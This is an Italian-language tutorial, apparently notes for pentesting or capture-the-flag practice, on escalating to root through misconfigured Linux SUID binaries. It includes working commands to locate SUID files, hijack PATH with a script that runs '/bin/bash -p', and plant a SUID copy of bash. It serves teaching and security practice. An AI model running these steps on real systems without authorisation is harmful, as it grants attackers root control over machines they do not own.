# Exploiting SUID Binaries

Oltre ai permessi classici di **lettura**, **scrittura** ed **esecuzione**, Linux introduce anche **permessi speciali**. <br>
Uno di questi è il **SUID** (*Set owner User ID*), che, se applicato a un file binario eseguibile, permette a chi lo esegue di farlo con i **privilegi del proprietario del file**, anziché con quelli del proprio utente.

Questa caratteristica, se mal configurata, può aprire la porta a **privilege escalation**, consentendo a un utente senza privilegi di eseguire comandi con i privilegi di root.

---

## 1 – Cosa sono i permessi SUID e perché sono pericolosi

Un file con SUID impostato appare nei permessi così:

```bash
-rwsr-xr-x 1 root root 12345 data nomefile
```

La `s` al posto della `x` nel primo gruppo di permessi indica che il file è eseguibile con i permessi del **proprietario** (`root` in questo esempio). <br>
Se il contenuto del file è modificabile, o se sfrutta comandi eseguibili controllabili dall’utente, può essere manipolato per ottenere privilegi elevati.

### Esempio:
Immagina uno script C che chiama il comando `cp` senza specificare il path assoluto (`/bin/cp`). Se un utente controlla una versione malevola di `cp` nella `$PATH`, questa verrà eseguita con i permessi dell’utente proprietario (es. root), permettendo di ottenere una shell privilegiata.

---

## 2 – Ricognizione: individuare i file con SUID

Dopo aver ottenuto una shell non privilegiata sulla macchina target:

```bash
whoami                   # Controlla l'utente attivo
id o groups <nomeutente> # Mostra i gruppi associati
```

Per trovare i file con bit SUID attivo:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Questa ricerca mostra tutti i file con il bit `SUID` impostato (`4000`), ignorando gli errori di permesso (`2>/dev/null`).

---

## 3 – Analisi dei binari sospetti

Quando troviamo un binario sospetto, controlliamone i permessi:

```bash
ls -la /percorso/nomefile
```

E analizziamo le **stringhe leggibili** al suo interno:

```bash
strings /percorso/nomefile
```

> Le "stringhe" sono sequenze di caratteri ASCII stampabili nel file binario. Analizzarle ci aiuta a capire se lo script chiama altri binari o comandi del sistema.

Se lo script richiama un altro comando (es. `bash`, `cp`, `mv`, `cat`, ecc.), possiamo provare a **sostituire quel comando** con una versione malevola controllata da noi.
Quindi rimuoviamo il file `rm file` e successiametne copiamo la bash nella directory corrente usando il comando
```
cp /bin/bash nomefileeliminato
```

### se il file è modificabile:
Se il file SUID chiama, ad esempio, `myscript`, possiamo creare un file `/tmp/myscript` che contiene:

```bash
#!/bin/bash
/bin/bash -p
```

Dove `-p` avvia una shell con gli **effettivi privilegi** del processo padre. Quindi:

```bash
chmod +x /tmp/myscript
export PATH=/tmp:$PATH
```

Dopodiché eseguiamo il file vulnerabile con SUID e otteniamo una shell privilegiata.

---

## 4 – Alternativa: sostituzione di binario

Se invece il binario ci permette di copiare file o di sostituirli, possiamo:

```bash
cp /bin/bash ./nomefile
chmod +s nomefile
```

Questo crea un nuovo file `nomefile` che è una copia di `bash` ma con bit SUID attivo. Eseguendolo:

```bash
./nomefile -p
```

Si ottiene una shell con privilegi elevati.

---
